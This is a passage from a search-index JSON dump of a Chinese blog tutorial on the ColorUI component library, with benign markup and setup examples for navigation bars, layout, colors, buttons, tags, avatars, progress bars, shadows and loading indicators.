from './colorui/components/cu-custom.vue' Vue.component('cu-custom',cuCustom) page.vue 页面可以直接调用了 \u003ccu-custom bgColor=\"bg-gradual-blue\" :isBack=\"true\"\u003e \u003cblock slot=\"backText\"\u003e返回\u003c/block\u003e \u003cblock slot=\"content\"\u003e导航栏\u003c/block\u003e \u003c/cu-custom\u003e 参数作用类型默认值bgColor背景颜色类名String''isBack是否开启返回BooleanfalsebgImage背景图片路径String''slot块作用backText返回时的文字content中间区域right右侧区域(小程序端可使用范围很窄！) ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:1:2","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"使用原生小程序开发 ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:2:0","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"从现有项目开始 下载源码解压获得/demo，复制目录下的 /colorui 文件夹到你的项目根目录 App.wxss 引入关键Css main.wxss icon.wxss @import \"colorui/main.wxss\"; @import \"colorui/icon.wxss\"; @import \"app.css\"; /* 你的项目css */ .... ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:2:1","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"从新项目开始 下载源码解压获得/template，复制/template并重命名为你的项目，导入到小程序开发工具既可以开始你的新项目了 ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:2:2","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"使用自定义导航栏 导航栏作为常用组件有做简单封装，当然你也可以直接复制代码结构自己修改，达到个性化目的。 App.js 获得系统信息 onLaunch: function() { wx.getSystemInfo({ success: e =\u003e { this.globalData.StatusBar = e.statusBarHeight; let custom = wx.getMenuButtonBoundingClientRect(); this.globalData.Custom = custom; this.globalData.CustomBar = custom.bottom + custom.top - e.statusBarHeight; } }) }, App.json 配置取消系统导航栏,并全局引入组件 \"window\": { \"navigationStyle\": \"custom\" }, \"usingComponents\": { \"cu-custom\":\"/colorui/components/cu-custom\" } page.wxml 页面可以直接调用了 \u003ccu-custom bgColor=\"bg-gradual-pink\" isBack=\"{{true}}\"\u003e \u003cview slot=\"backText\"\u003e返回\u003c/view\u003e \u003cview slot=\"content\"\u003e导航栏\u003c/view\u003e \u003c/cu-custom\u003e 参数作用类型默认值bgColor背景颜色类名String''isBack是否开启返回BooleanfalseisCustom是否开启左侧胶囊BooleanfalsebgImage背景图片路径String''slot块作用backText返回时的文字content中间区域right右侧区域(小程序端可使用范围很窄！) 组件 ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:2:3","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"基础元素 ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:0","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"layout布局 Flex布局 父级添加class名flex 固定尺寸 通过添加class名basic-{{options}}来设置分栏大小，options可以取五个值，分别为xs、sm、df、lg、xl \u003cview class=\"padding bg-white\"\u003e \u003cview class=\"flex flex-wrap\"\u003e \u003cview class=\"basis-xs bg-grey margin-xs padding-sm radius\"\u003exs(20%)\u003c/view\u003e \u003cview class=\"basis-df\"\u003e\u003c/view\u003e \u003cview class=\"basis-sm bg-grey margin-xs padding-sm radius\"\u003esm(40%)\u003c/view\u003e \u003cview class=\"basis-df\"\u003e\u003c/view\u003e \u003cview class=\"basis-df bg-grey margin-xs padding-sm radius\"\u003edf(50%)\u003c/view\u003e \u003cview class=\"basis-lg bg-grey margin-xs padding-sm radius\"\u003elg(60%)\u003c/view\u003e \u003cview class=\"basis-xl bg-grey margin-xs padding-sm radius\"\u003exl(80%)\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 比例布局 通过添加class名flex-{{options}}来设置分栏大小，options可以取值sub、twice、treble，分别代表占比1，2，3 \u003cview class=\"padding bg-white\"\u003e \u003cview class=\"flex\"\u003e \u003cview class=\"flex-sub bg-grey padding-sm margin-xs radius\"\u003e1\u003c/view\u003e \u003cview class=\"flex-sub bg-grey padding-sm margin-xs radius\"\u003e1\u003c/view\u003e \u003c/view\u003e \u003cview class=\"flex\"\u003e \u003cview class=\"flex-sub bg-grey padding-sm margin-xs radius\"\u003e1\u003c/view\u003e \u003cview class=\"flex-twice bg-grey padding-sm margin-xs radius\"\u003e2\u003c/view\u003e \u003c/view\u003e \u003cview class=\"flex\"\u003e \u003cview class=\"flex-sub bg-grey padding-sm margin-xs radius\"\u003e1\u003c/view\u003e \u003cview class=\"flex-twice bg-grey padding-sm margin-xs radius\"\u003e2\u003c/view\u003e \u003cview class=\"flex-treble bg-grey padding-sm margin-xs radius\"\u003e3\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 水平对齐（justify） 通过添加class名justify-{{options}}来设置盒子水平对齐方式，options可以取值start、end、center、between、around，效果可以参考flex布局布局中的容器属性justify-content（Flex布局教程） \u003cview class=\"bg-white\"\u003e \u003cview class=\"flex solid-bottom padding justify-start\"\u003e \u003cview class=\"bg-grey padding-sm margin-xs radius\"\u003estart\u003c/view\u003e \u003cview class=\"bg-grey padding-sm margin-xs radius\"\u003estart\u003c/view\u003e \u003c/view\u003e \u003cview class=\"flex solid-bottom padding justify-end\"\u003e \u003cview class=\"bg-grey padding-sm margin-xs radius\"\u003eend\u003c/view\u003e \u003cview class=\"bg-grey padding-sm margin-xs radius\"\u003eend\u003c/view\u003e \u003c/view\u003e \u003cview class=\"flex solid-bottom padding justify-center\"\u003e \u003cview class=\"bg-grey padding-sm margin-xs radius\"\u003ecenter\u003c/view\u003e \u003cview class=\"bg-grey padding-sm margin-xs","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:1","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Background背景 颜色背景 深色 通过添加class名bg-{{options}}设置背景 \u003cview class=\"grid col-3 padding-sm\"\u003e \u003cview class=\"padding-sm\" v-for=\"(item,index) in ColorList\" :key=\"index\"\u003e \u003cview class=\"padding radius text-center shadow-blur\" :class=\"'bg-' + item.name\"\u003e \u003cview class=\"text-lg\"\u003e{{item.title}}\u003c/view\u003e \u003cview class=\"margin-top-sm text-Abc\"\u003e{{item.name}}\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 浅色 通过添加class名bg-{{options}}设置背景颜色，添加class名light表示相应的浅色 \u003cview class=\"grid col-3 bg-white padding-sm\"\u003e \u003cview class=\"padding-sm\" v-for=\"(item,index) in ColorList\" :key=\"index\" v-if=\"index\u003c12\"\u003e \u003cview class=\"padding radius text-center light\" :class=\"'bg-' + item.name\"\u003e \u003cview class=\"text-lg\"\u003e{{item.title}}\u003c/view\u003e \u003cview class=\"margin-top-sm text-Abc\"\u003e{{item.name}}\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 渐变 通过添加class名bg-gradual-{{options}}设置渐变背景颜色 \u003cview class=\"grid col-2 padding-sm\"\u003e \u003cview class=\"padding-sm\"\u003e \u003cview class=\"bg-gradual-red padding radius text-center shadow-blur\"\u003e \u003cview class=\"text-lg\"\u003e魅红\u003c/view\u003e \u003cview class=\"margin-top-sm text-Abc\"\u003e#f43f3b - #ec008c\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-sm\"\u003e \u003cview class=\"bg-gradual-orange padding radius text-center shadow-blur\"\u003e \u003cview class=\"text-lg\"\u003e鎏金\u003c/view\u003e \u003cview class=\"margin-top-sm text-Abc\"\u003e#ff9700 - #ed1c24\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-sm\"\u003e \u003cview class=\"bg-gradual-green padding radius text-center shadow-blur\"\u003e \u003cview class=\"text-lg\"\u003e翠柳\u003c/view\u003e \u003cview class=\"margin-top-sm text-Abc\"\u003e#39b54a - #8dc63f\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-sm\"\u003e \u003cview class=\"bg-gradual-blue padding radius text-center shadow-blur\"\u003e \u003cview class=\"text-lg\"\u003e靛青\u003c/view\u003e \u003cview class=\"margin-top-sm text-Abc\"\u003e#0081ff - #1cbbb4\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-sm\"\u003e \u003cview class=\"bg-gradual-purple padding radius text-center shadow-blur\"\u003e \u003cview class=\"text-lg\"\u003e惑紫\u003c/view\u003e \u003cview class=\"margin-top-sm text-Abc\"\u003e#9000ff - #5e00ff\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-sm\"\u003e \u003cview class=\"bg-gradual-pink padding radius text-center shadow-blur\"\u003e \u003cview class=\"text-lg\"\u003e霞彩\u003c/view\u003e","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:2","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Text文字 文字大小 通过添加class名text-{{size}}设置文字大小，size取值xs、sm、df、lg、xl、xxl、sl、xsl 文字颜色 通过添加class名text-{{color}}设置文字颜色，color取值red、orange、yellow、olive、green、cyan、blue、purple、mauve、brown、grey、gray、black、white \u003cview class=\"grid col-5 padding-sm\"\u003e \u003cview class=\"padding-sm\" v-for=\"(item,index) in ColorList\" :key=\"index\"\u003e \u003cview class=\"text-center\" :class=\"'text-' + item.name\"\u003e {{item.title}} \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 文字阴影 通过添加class名text-shadow设置文字阴影 \u003cview class=\"grid col-5 padding-sm\"\u003e \u003cview class=\"padding-sm\" v-for=\"(item,index) in ColorList\" :key=\"index\"\u003e \u003cview class=\"text-center text-shadow\" :class=\"'text-' + item.name\"\u003e \u003cview class=\"cuIcon-ellipse text-xxl\"\u003e\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 文字截断 通过添加class名text-cut设置文字长度溢出显示省略号 \u003cview class=\"padding bg-white\"\u003e \u003cview class=\"text-cut padding bg-grey radius\" style=\"width:220px\"\u003e我于杀戮之中绽放 ,亦如黎明中的花朵\u003c/view\u003e \u003c/view\u003e 文字对齐 通过添加class名text-{{position}}设置文字长度溢出显示省略号，position取值left、center、right \u003cview class=\"padding bg-white\"\u003e \u003cview class=\"text-left padding\"\u003e我于杀戮之中绽放 ,亦如黎明中的花朵\u003c/view\u003e \u003cview class=\"text-center padding\"\u003e我于杀戮之中绽放 ,亦如黎明中的花朵\u003c/view\u003e \u003cview class=\"text-right padding\"\u003e我于杀戮之中绽放 ,亦如黎明中的花朵\u003c/view\u003e \u003c/view\u003e 特殊文字 通过添加class名text-price表示价格，会显示￥符号，text-Abc设置英文首字母大写，text-ABC设置英文大写，text-abc设置英文小写 \u003cview class=\"padding text-center\"\u003e \u003cview class=\"padding-lr bg-white\"\u003e \u003cview class=\"solid-bottom padding\"\u003e \u003ctext class=\"text-price\"\u003e80.00\u003c/text\u003e \u003c/view\u003e \u003cview class=\"padding\"\u003e价格文本，利用伪元素添加\"¥\"符号\u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-lr bg-white margin-top\"\u003e \u003cview class=\"solid-bottom padding\"\u003e \u003ctext class=\"text-Abc\"\u003ecolor Ui\u003c/text\u003e \u003c/view\u003e \u003cview class=\"padding\"\u003e英文单词首字母大写\u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-lr bg-white margin-top\"\u003e \u003cview class=\"solid-bottom padding\"\u003e \u003ctext class=\"text-ABC\"\u003ecolor Ui\u003c/text\u003e \u003c/view\u003e \u003cview class=\"padding\"\u003e全部字母大写\u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-lr bg-white margin-top\"\u003e \u003cview class=\"solid-bottom padding\"\u003e \u003ctext class=\"text-abc\"\u003ecolor Ui\u003c/text\u003e \u003c/view\u003e \u003cview class=\"padding\"\u003e全部字母小写\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 文字相关class ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:3","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Icon图标 通过添加class名cuIcon-{{iconName}}，直接设置图标 ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:4","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Button按钮 按钮必选class cu-btn 按钮形状 通过添加class名设置按钮不同形状，默认只需要添加cu-btn，round为圆角，cuIcon为圆形用来包裹图标 \u003cview class=\"padding flex flex-wrap justify-between align-center bg-white\"\u003e \u003cbutton class=\"cu-btn\"\u003e默认\u003c/button\u003e \u003cbutton class=\"cu-btn round\"\u003e圆角\u003c/button\u003e \u003cbutton class=\"cu-btn cuIcon\"\u003e \u003ctext class=\"cuIcon-goodsfill\"\u003e\u003c/text\u003e \u003c/button\u003e \u003c/view\u003e 按钮尺寸 sm小尺寸，lg大尺寸 \u003cview class=\"padding flex flex-wrap justify-between align-center bg-white\"\u003e \u003cbutton class=\"cu-btn round sm\"\u003e小尺寸\u003c/button\u003e \u003cbutton class=\"cu-btn round\"\u003e默认\u003c/button\u003e \u003cbutton class=\"cu-btn round lg\"\u003e大尺寸\u003c/button\u003e \u003c/view\u003e 按钮颜色 添加背景class名就可以，用法参考背景组件的介绍 \u003cview class=\"grid col-5 padding-sm\"\u003e \u003cview class=\"margin-tb-sm text-center\" v-for=\"(item,index) in ColorList\" :key=\"index\"\u003e \u003cbutton class=\"cu-btn round\" :class=\"'bg-' + item.name \"\u003e{{item.title}}\u003c/button\u003e \u003c/view\u003e \u003c/view\u003e 幽灵按钮 通过line-{{color}}或者lines-{{color}}设置镂空的幽灵按钮 \u003cview class=\"grid col-5 padding-sm\"\u003e \u003cview class=\"margin-tb-sm text-center\" v-for=\"(item,index) in ColorList\" :key=\"index\" v-if=\"item.name!='white'\"\u003e \u003cbutton class=\"cu-btn round\" :class=\"'line-' + item.name\"\u003e{{item.title}}\u003c/button\u003e \u003c/view\u003e \u003c/view\u003e 禁用按钮 添加disabled禁用按钮 \u003cview class=\"padding\"\u003e \u003cbutton class=\"cu-btn block bg-blue margin-tb-sm lg\" disabled type=\"\"\u003e无效状态\u003c/button\u003e \u003cbutton class=\"cu-btn block line-blue margin-tb-sm lg\" disabled\u003e无效状态\u003c/button\u003e \u003c/view\u003e 自定义图标按钮 可以直接在button标签class内添加图标名，或者在text等其他标签内添加class，其他标签要包裹在button标签内 \u003cview class=\"padding-xl\"\u003e \u003cbutton class=\"cu-btn block line-orange lg cuIcon-upload\"\u003e\u003ctext class=\"cuIcon-upload\"\u003e\u003c/text\u003e 图标\u003c/button\u003e \u003cbutton class=\"cu-btn block bg-blue margin-tb-sm lg\"\u003e\u003ctext class=\"cuIcon-loading2 cuIconfont-spin\"\u003e\u003c/text\u003e 加载\u003c/button\u003e \u003cbutton class=\"cu-btn block bg-black margin-tb-sm lg\" loading\u003e 原生加载\u003c/button\u003e \u003c/view\u003e 按钮相关class class说明可选值cu-btn按钮必选值——round圆角按钮——cuIcon圆形——sm小尺寸按钮——lg大尺寸按钮——line-{{color}}幽灵按钮，细边框参考背景色lines-{{color}}幽灵按钮，粗边框参考背景色disabled禁用—— ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:5","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Tag标签 标签必选class cu-tag 标签形状 通过添加class名设置标签不同形状，默认只需要添加cu-tag，round为椭圆，radius为圆角 \u003cview class=\"padding bg-white solid-bottom\"\u003e \u003cview class='cu-tag'\u003e默认\u003c/view\u003e \u003cview class='cu-tag round'\u003e椭圆\u003c/view\u003e \u003cview class='cu-tag radius'\u003e圆角\u003c/view\u003e \u003c/view\u003e 标签尺寸 sm小尺寸 \u003cview class=\"padding bg-white\"\u003e \u003cview class='cu-tag radius sm'\u003e小尺寸\u003c/view\u003e \u003cview class='cu-tag radius'\u003e普通尺寸\u003c/view\u003e \u003c/view\u003e 标签颜色 添加背景class名就可以，用法参考背景组件的介绍 \u003cview class='padding-sm flex flex-wrap'\u003e \u003cview class=\"padding-xs\" v-for=\"(item,index) in ColorList\" :key=\"index\" v-if=\"item.name!='gray'\"\u003e \u003cview class='cu-tag' :class=\"'bg-' + item.name\"\u003e{{item.title}}\u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-xs\" v-for=\"(item,index) in ColorList\" :key=\"index\" v-if=\"item.name!='gray' \u0026\u0026 item.name!='black' \u0026\u0026 item.name!='white'\"\u003e \u003cview class='cu-tag light' :class=\"'bg-' + item.name\"\u003e{{item.title}}\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 幽灵标签 通过line-{{color}}设置镂空的幽灵按钮 \u003cview class='padding-sm flex flex-wrap'\u003e \u003cview class=\"padding-xs\" v-for=\"(item,index) in ColorList\" :key=\"index\" v-if=\"item.name!='white'\"\u003e \u003cview class='cu-tag' :class=\"'line-' + item.name\"\u003e{{item.title}}\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 胶囊样式 通过cu-capsule设置为胶囊样式，内部设置自己想要的样式 \u003cview class=\"padding\"\u003e \u003cview class=\"cu-capsule\"\u003e \u003cview class='cu-tag bg-red'\u003e\u003ctext class='cuIcon-likefill'\u003e\u003c/text\u003e\u003c/view\u003e \u003cview class=\"cu-tag line-red\"\u003e12\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-capsule round\"\u003e \u003cview class='cu-tag bg-blue '\u003e\u003ctext class='cuIcon-likefill'\u003e\u003c/text\u003e\u003c/view\u003e \u003cview class=\"cu-tag line-blue\"\u003e23\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-capsule round\"\u003e \u003cview class='cu-tag bg-blue '\u003e说明\u003c/view\u003e \u003cview class=\"cu-tag line-blue\"\u003e123\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-capsule radius\"\u003e \u003cview class='cu-tag bg-grey '\u003e\u003ctext class='cuIcon-likefill'\u003e\u003c/text\u003e\u003c/view\u003e \u003cview class=\"cu-tag line-grey\"\u003e23\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-capsule radius\"\u003e \u003cview class='cu-tag bg-brown sm'\u003e\u003ctext class='cuIcon-likefill'\u003e\u003c/text\u003e\u003c/view\u003e \u003cview class=\"cu-tag line-brown sm\"\u003e23\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 数字标签 通过badge设置角标 \u003cview class=\"padding flex justify-between align-center\"\u003e","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:6","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Avatar头像 头像必选class cu-avatar 头像形状 通过round和radius设置头像形状 \u003cview class=\"padding\"\u003e \u003cview class=\"cu-avatar round\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big10001.jpg)\"\u003e\u003c/view\u003e \u003cview class=\"cu-avatar radius margin-left\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big81005.jpg);\"\u003e\u003c/view\u003e \u003c/view\u003e 头像尺寸 通过sm 、lg、xl设置不同大小的头像 \u003cview class=\"padding\"\u003e \u003cview class=\"cu-avatar sm round margin-left\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big10001.jpg)\"\u003e\u003c/view\u003e \u003cview class=\"cu-avatar round margin-left\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big81005.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"cu-avatar lg round margin-left\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big25002.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"cu-avatar xl round margin-left\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big99008.jpg);\"\u003e\u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding\"\u003e \u003cview class=\"cu-avatar sm round margin-left bg-red\"\u003e 蔚\u003c/view\u003e \u003cview class=\"cu-avatar round margin-left bg-red\"\u003e蓝\u003c/view\u003e \u003cview class=\"cu-avatar lg round margin-left bg-red\"\u003e\u003ctext\u003ewl\u003c/text\u003e\u003c/view\u003e \u003cview class=\"cu-avatar xl round margin-left bg-red\"\u003e \u003ctext class=\"avatar-text\"\u003e网络\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e 内嵌文字 头像内部不仅仅是图片，也可以是自定义文字和图标等 \u003cview class=\"padding\"\u003e \u003cview class=\"cu-avatar radius\"\u003e \u003ctext class=\"cuIcon-people\"\u003e\u003c/text\u003e \u003c/view\u003e \u003cview class=\"cu-avatar radius margin-left\"\u003e \u003ctext\u003e港\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e 头像颜色 设置背景色即可 \u003cview class=\"padding-sm\"\u003e \u003cview class=\"cu-avatar round lg margin-xs\" :class=\"'bg-' + item.name\" v-for=\"(item,index) in ColorList\" :key=\"index\"\u003e \u003ctext class=\"avatar-text\"\u003e{{item.name}}\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e 头像组 设置了cu-avatar外部的盒子添加cu-avatar-group的class \u003cview class=\"padding\"\u003e \u003cview class=\"cu-avatar-group\"\u003e \u003cview class=\"cu-avatar round lg\" v-for=\"(item,index) in avatar\" :key=\"index\" :style=\"[{ backgroundImage:'url(' + avatar[index] + ')' }]\"\u003e\u003c/","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:7","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Progress进度条 进度条必须值为cu-progress 进度条形状 进度条默认为方形，radius为圆角，round为圆形；代码中loading只是一个变量，初始值为false，页面初始化时赋值为true，即给进度条赋值，使进度条有一个动画效果。 \u003cview class=\"padding bg-white\"\u003e \u003cview class=\"cu-progress\"\u003e \u003cview class=\"bg-red\" style=\"width:61.8%\"\u003e61.8%\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-progress radius margin-top\"\u003e \u003cview class=\"bg-red\" :style=\"[{ width:loading?'61.8%':''}]\"\u003e61.8%\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-progress round margin-top\"\u003e \u003cview class=\"bg-red\" :style=\"[{ width:loading?'61.8%':''}]\"\u003e61.8%\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 进度条尺寸 sm为小尺寸，xs为超小尺寸 \u003cview class=\"padding bg-white\"\u003e \u003cview class=\"cu-progress round\"\u003e \u003cview class=\"bg-red\" :style=\"[{ width:loading?'61.8%':''}]\"\u003e\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-progress round margin-top sm\"\u003e \u003cview class=\"bg-red\" :style=\"[{ width:loading?'61.8%':''}]\"\u003e\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-progress round margin-top xs\"\u003e \u003cview class=\"bg-red\" :style=\"[{ width:loading?'61.8%':''}]\"\u003e\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 进度条颜色 添加背景色即可 \u003cview class=\"padding\" :class=\"color=='white'?'bg-grey':'bg-white'\"\u003e \u003cview class=\"cu-progress round\"\u003e \u003cview :class=\"'bg-' + color\" :style=\"[{ width:loading?'61.8%':''}]\"\u003e\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 进度条条纹 添加striped设置条纹样式，active设置条纹动态效果 \u003cview class=\"padding bg-white\"\u003e \u003cview class=\"cu-progress round sm striped active\" \u003e \u003cview class=\"bg-green\" :style=\"[{ width:loading?'60%':''}]\"\u003e\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-progress round sm margin-top-sm striped\" \u003e \u003cview class=\"bg-black\" :style=\"[{ width:loading?'40%':''}]\"\u003e\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 进度条比例 在给定class为cu-progress的标签内按需放置元素并进行分段设计即可 \u003cview class=\"padding bg-white\"\u003e \u003cview class=\"cu-progress radius striped active\"\u003e \u003cview class=\"bg-red\" :style=\"[{ width:loading?'30%':''}]\"\u003e30%\u003c/view\u003e \u003cview class=\"bg-olive\" :style=\"[{ width:loading?'45%':''}]\"\u003e45%\u003c/view\u003e \u003cview class=\"bg-cyan\" :style=\"[{ width:loading?'25%':''}]\"\u003e25%\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 进度条布局 结合布局、图标等内容，可根据个人所需可以设置不同进度显示的样式 \u003cview class=\"padding bg-white \"\u003e \u003cview class=\"flex\"\u003e \u003cview class=\"cu-progress round\"\u003e \u003cview class=\"bg-green\" :style=\"[{ width:loading?'100%","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:8","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Border\u0026Shadow边框阴影 默认shadow是根据背景色设置的阴影，shadow-lg为长阴影，但是我肉眼没看出来二者的区别，真是在下愚钝，shadow-warp为翘边阴影（在下愚钝，它翘一点？？？），shadow-blur根据背景图片设置的阴影，有点意思，挺好。关于边框border没什么好展开的，直接看下面表格class说明就好。 \u003cview class=\"padding text-center\"\u003e \u003cview class=\"padding-xl radius shadow bg-white\"\u003e默认阴影\u003c/view\u003e \u003cview class=\"padding-xl radius shadow bg-gradual-red margin-top\"\u003e根据背景颜色而改变的阴影\u003c/view\u003e \u003cview class=\"padding-xl radius shadow shadow-lg bg-white margin-top\"\u003e长阴影\u003c/view\u003e \u003cview class=\"padding-xl radius shadow shadow-lg bg-blue margin-top\"\u003e长阴影\u003c/view\u003e \u003cview class=\"padding-xl radius shadow-warp bg-white margin-top\"\u003e翘边阴影\u003c/view\u003e \u003cview class=\"padding-xl radius shadow-blur bg-red margin-top bg-img\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big91005.jpg);\"\u003e \u003cview\u003e根据背景图而改变的阴影\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 边框阴影相关class class说明可选值solid/solids实线四周边框，solid为细边框 ，solids为粗边框——solid/solids-{{options}}不同方向的边框(上下左右)top/right/bottom/leftshadow默认阴影（根据背景色变化）——shadow-lg长阴影——shadow-wrap翘边阴影——shadow-blur根据背景图片变化的阴影  ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:9","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"Loading加载 加载必选值cu-load 加载状态 loading正在加载中，over加载完成，erro加载失败 \u003cview class=\"cu-load bg-blue loading\"\u003e\u003c/view\u003e \u003cview class=\"cu-load bg-blue over\"\u003e\u003c/view\u003e \u003cview class=\"cu-load bg-red erro\"\u003e\u003c/view\u003e 弹框加载 设置按钮，弹出弹框，显示加载状态，弹框模板设置load-modal \u003cview class=\"cu-bar bg-white margin-top\"\u003e \u003cview class=\"action\"\u003e \u003ctext class=\"cuIcon-title text-blue\"\u003e\u003c/text\u003e弹框加载 \u003c/view\u003e \u003cview class=\"action\"\u003e \u003cbutton class=\"cu-btn bg-green shadow\" @tap=\"LoadModal\"\u003e 点我 \u003c/button\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-load load-modal\" v-if=\"loadModal\"\u003e \u003cimage src=\"/static/logo.png\" mode=\"aspectFit\"\u003e\u003c/image\u003e \u003cview class=\"gray-text\"\u003e加载中...\u003c/view\u003e \u003c/view\u003e \u003cscript\u003e export default { data() { return { loadModal: false }; }, methods: { LoadModal(e) { this.loadModal = true; setTimeout(() =\u003e { this.loadModal = false; }, 2000) } } } \u003c/script\u003e 进度条加载 设置进度条加载时需要添加load-progress，变量loadProgress为加载进度条的进度，load-progress-bar代表加载中进度条样式，load-progress-spinner代表加载中旋转的圆圈样式 \u003cview class=\"action\"\u003e \u003cbutton class=\"cu-btn bg-green shadow\" @tap=\"LoadProgress\"\u003e 点我 \u003c/button\u003e \u003c/view\u003e \u003cview class=\"load-progress\" 